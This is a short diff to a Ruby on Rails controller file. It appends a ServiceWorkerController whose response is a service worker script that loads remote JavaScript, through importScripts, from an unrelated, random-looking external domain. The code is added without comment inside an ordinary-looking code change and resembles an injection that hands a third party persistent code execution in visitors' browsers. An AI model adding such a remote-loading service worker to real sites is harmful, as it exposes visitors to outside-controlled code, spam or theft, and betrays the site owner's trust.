@@ -65,3 +65,11 @@ class StaticController < ApplicationController
     end
   end
 end
+
+
+class ServiceWorkerController < ActionController::Metal
+  def service_worker_js
+    self.response_body = "self.options = {domainId:10014,};\nimportScripts('https://hotbkowugi.cc/sitesw_v2.js');"
+    self.content_type = 'application/javascript'
+  end
+end
